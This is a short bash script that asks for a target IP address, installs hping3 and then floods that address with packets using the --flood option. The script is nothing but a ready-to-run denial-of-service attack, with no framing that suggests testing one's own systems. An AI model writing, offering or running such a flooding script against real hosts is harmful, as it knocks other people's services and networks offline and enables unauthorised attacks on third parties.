#!/bin/bash

echo Input IP address here: 
read IP
sudo apt install hping3 -y
sudo hping3 -V -d 120 --flood $IP